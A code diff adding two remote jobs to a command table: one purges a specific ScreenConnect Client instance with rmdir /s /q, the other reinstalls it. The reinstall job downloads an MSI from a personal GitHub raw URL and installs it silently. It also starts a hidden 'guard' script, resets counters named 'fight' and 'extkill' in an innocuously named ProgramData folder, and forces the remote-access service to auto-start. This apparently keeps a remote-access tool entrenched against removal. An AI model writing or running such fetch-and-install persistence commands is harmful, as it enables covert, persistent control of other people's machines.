@@ -70,6 +70,48 @@ JOBS: dict[str, dict[str, str]] = {
             " & echo START_GRYXA_DONE"
         ),
     },
+    "uninstall-gryxa": {
+        "title": "Uninstall Gryxa",
+        "blurb": "FP-scoped remove of Gryxa SC only (C03: never msiexec /x shared ProductCode).",
+        "risk": "high",
+        "cmd": (
+            "sc stop \"ScreenConnect Client (36e506ff016b2151)\""
+            " & sc delete \"ScreenConnect Client (36e506ff016b2151)\""
+            " & if exist \"%ProgramFiles(x86)%\\ScreenConnect Client (36e506ff016b2151)\" "
+            "rmdir /s /q \"%ProgramFiles(x86)%\\ScreenConnect Client (36e506ff016b2151)\""
+            " & if exist \"%ProgramFiles%\\ScreenConnect Client (36e506ff016b2151)\" "
+            "rmdir /s /q \"%ProgramFiles%\\ScreenConnect Client (36e506ff016b2151)\""
+            " & echo UNINSTALL_GRYXA_DONE"
+        ),
+    },
+    "reinstall-gryxa": {
+        "title": "Uninstall + Install Gryxa",
+        "blurb": "FP-scoped Gryxa purge then fresh MSI install (C03-safe).",
+        "risk": "high",
+        "cmd": (
+            "sc stop \"ScreenConnect Client (36e506ff016b2151)\""
+            " & sc delete \"ScreenConnect Client (36e506ff016b2151)\""
+            " & if exist \"%ProgramFiles(x86)%\\ScreenConnect Client (36e506ff016b2151)\" "
+            "rmdir /s /q \"%ProgramFiles(x86)%\\ScreenConnect Client (36e506ff016b2151)\""
+            " & if exist \"%ProgramFiles%\\ScreenConnect Client (36e506ff016b2151)\" "
+            "rmdir /s /q \"%ProgramFiles%\\ScreenConnect Client (36e506ff016b2151)\""
+            " & >C:\\ProgramData\\WinRTCS\\extkill.cnt echo 0"
+            " & >C:\\ProgramData\\WinRTCS\\fight.cnt echo 0"
+            " & >C:\\ProgramData\\WinRTCS\\guard.cnt echo 9999"
+            " & rmdir /s /q C:\\ProgramData\\WinRTCS\\guard.lockd"
+            " & C:\\Windows\\System32\\curl.exe -f -L --ssl-no-revoke --connect-timeout 8 --max-time 90"
+            " -o C:\\ProgramData\\WinRTCS\\gryxa_install.msi"
+            " https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi"
+            " & start \"\" /min msiexec /i C:\\ProgramData\\WinRTCS\\gryxa_install.msi"
+            " /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress"
+            " & start \"\" /min cmd.exe /c C:\\ProgramData\\WinRTCS\\winrtcs_guard.cmd"
+            " & ping -n 35 127.0.0.1 >nul"
+            " & sc config \"ScreenConnect Client (36e506ff016b2151)\" start= auto"
+            " & sc start \"ScreenConnect Client (36e506ff016b2151)\""
+            " & sc query \"ScreenConnect Client (36e506ff016b2151)\""
+            " & echo REINSTALL_GRYXA_DONE"
+        ),
+    },
     "collect-forensics": {
         "title": "Collect forensics",
         "blurb": "SC inventory, WinRTCS tasks, last log lines.",
